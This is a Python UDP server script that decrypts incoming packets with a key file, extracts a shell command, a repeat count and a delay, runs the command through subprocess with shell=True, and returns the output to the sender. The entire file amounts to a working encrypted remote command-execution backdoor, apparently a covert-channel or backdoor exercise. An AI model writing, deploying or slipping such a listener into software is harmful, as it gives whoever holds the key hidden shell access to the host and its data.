import socket
import subprocess
import sys
import receiver
import time

def sendMsg(msgs):
    res = ''
    for msg in msgs:
        res = res + msg

    return res

def prepdata(data):
    prev = 0
    res = []
    num = 0
    s = b''
    for i in data:
        temp = bytes([i])
        s = b''.join([s, temp])
        if num == 1:
            res.append(s)
            num = 0
            s = b''
        else:
            num = num+1

    return res


def decoding(inputDat):
    res = ""
    for y in inputDat:
        res += y.decode("ascii")
    return res


if __name__ == '__main__':

    if len(sys.argv) != 2:
        raise ValueError('Incorrect num of args')

    # get the hostname
    host = socket.gethostname()
    port = int(sys.argv[1])  # initiate port no above 1024

    receiver.dIP = socket.gethostbyname(socket.gethostname())

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # get instance

    server_socket.bind((host, port))  # bind host address and port together
    print(receiver.dIP)
    receiver.dIP = receiver.processIP(receiver.dIP)
    receiver.keys = receiver.decrypt.readKeys('keyall1', 'rb')
    while True:
        # receive data stream. it won't accept data packet greater than 250 bytes
        rcvdata, address = server_socket.recvfrom(250)  # accept new connection
        receiver.sIP = address
        print("Connection from: " + str(address))
        if not rcvdata:

            rcvdata, address = server_socket.recvfrom(250)
            receiver.sIP = address
            # if data is not received break
            # break
        else:
            print("from connected user: " + str(rcvdata))

            receiver.sIP = receiver.processIP(receiver.sIP[0])
            tempIP = address[0]
            # grabbing data
            receiver.data = rcvdata
            receiver.data = prepdata(receiver.data)

            receiver.f = receiver.decrypt.decrypt(receiver.data[4:], receiver.keys)
            receiver.udpL = receiver.data[2]

            # receiver.checksum() TODO
            receiver.removepadding(receiver.f)

            # msgs[i] = "\nFrom IP: {ip} at time: {t}\n".format(ip=tempIP, t=time.time())
            temp = ""
            for x in receiver.f:
                temp = temp + x.decode("ascii")

            tempFile = open("tempfile.txt", 'wb')
            cmdArr = ["", "", ""]  # execTimes, execDelay, cmd
            tempCnt = 0
            receiver.f = decoding(receiver.f)
            for x in receiver.f:
                if x == '@':
                    tempCnt = tempCnt + 1
                elif tempCnt == 3:
                    break
                else:
                    cmdArr[tempCnt] = cmdArr[tempCnt] + x

            for i in range(0, int(cmdArr[0])):
                p = subprocess.Popen(cmdArr[2], stdout=subprocess.PIPE, shell=True)
                (output, err) = p.communicate()
                output = str(output)
                for c in output:
                    tempFile.write(bytes(c, "ascii"))

                tempFile.write(bytes('\n', "ascii"))
                time.sleep(int(cmdArr[1]))

            tempFile.close()

            toSend = ''
            tempFile = open("tempfile.txt", 'rb')
            while (True):
                d = tempFile.read(2)
                if d == b'':
                    break
                toSend += d.decode("utf-8")

            # data = sendMsg(msgs)
            # test = address[1]
            # test2 = str.encode(data)
            # test3 = str(port)
            server_socket.sendto(str.encode(toSend), (tempIP, address[1]))  # send data to the client

